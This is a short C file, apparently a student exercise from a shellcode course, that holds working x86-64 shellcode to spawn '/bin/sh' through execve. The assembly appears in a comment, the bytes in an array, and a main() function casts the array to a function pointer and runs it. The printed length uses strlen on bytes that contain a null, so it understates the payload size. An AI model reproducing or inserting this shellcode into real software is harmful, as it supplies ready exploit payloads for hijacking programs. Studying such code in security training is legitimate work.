#include<stdio.h>
#include<string.h>

// OS-20614
// eben_s_dowling@georgiasouthern.edu

/*
global _start

_start:

execve:

	mov rsi, rax
	mov rdx, rsi

	mov r12 , 0x68732f6e69622f
	push r12
	push rsp
	pop rdi
	mov al, 0x3b
	syscall	
*/



unsigned char code[] = \
	"\x48\x89\xc6"                 // mov    %rax,%rsi
	"\x48\x89\xf2"                 // mov    %rsi,%rdx
	"\x49\xbc\x2f\x62\x69\x6e\x2f" // movabs $0x68732f6e69622f,%r12
	"\x73\x68\x00"                
	"\x41\x54"                     // push   %r12
	"\x54"                         // push   %rsp
	"\x5f"                         // pop    %rdi
	"\xb0\x3b"                     // mov    $0x3b,%al
	"\x0f\x05"                     // syscall 
;

main()
{
 
    printf("Shellcode Length:  %d\n", (int)strlen(code));
 
    int (*ret)() = (int(*)())code;
 
    ret();
 
}